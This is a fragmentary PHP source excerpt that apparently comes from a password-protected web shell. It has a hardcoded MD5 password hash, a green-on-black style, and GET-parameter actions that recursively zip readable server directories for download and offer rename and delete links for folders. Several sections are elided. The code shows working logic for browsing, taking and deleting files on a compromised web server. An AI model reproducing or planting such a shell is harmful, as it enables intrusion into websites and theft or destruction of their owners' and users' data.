...
$auth_pass = "dca4682a76ef66a5a12861fc97810119"; // default: 
$color = "#00ff00";
...
if($_GET['logout'] == true) {
	...
	echo $act;
} elseif($_GET['act'] == 'zip_dir') {
	if(class_exists('ZipArchive')){
		function zip_file($dir, $zip, $source) {
			if(is_readable($dir)) {
				$dira = scandir($dir);
				foreach($dira as $dirb) {
					$dirc = "$dir/$dirb";
					if($dirb != '.' && $dirb != '..'){
						if(is_dir($dirc)) {
							if(is_readable($dirc)) {
								zip_file($dirc, $zip, $source);
							}
						}
						elseif(is_file($dirc)){
							if(is_readable($dirc)){
								$dir_zip = str_replace($source."/", "", $dirc);
								$zip->addFile($dir_zip);
							}
						}
					}
		...
		if($zip->open($dest, file_exists($dest) ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE)){
			zip_file($dir, $zip, $dir);

			$zip->close();

			echo "<p align=center><font color=lime>File is being process. Maybe your file isn't ready for now. Keep on waiting. Your file will be name: <a href='?act=download&dir=$dir&file=$file_dest'>$file_dest</a></font></p>";
		}
		else{
			echo "<p align=center><font color=red>Failed open zip dir</font></p>";
		}
	}
	else{
		echo "<p align=center><font color=red>Cannot initialize ZipArchive beacuse class doesn't exist</font></p>";
	}
	exit;
			...
			foreach($scandir as $dirx) {
				...
				if(function_exists('posix_getgrgid')) {
 				...
 				if($dirx === '.' || $dirx === '..') {
 					...
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a> | <a href='?act=zip_dir&dir=$dir/$dirx'>zip</a>";
 				}
 				echo "<tr>";
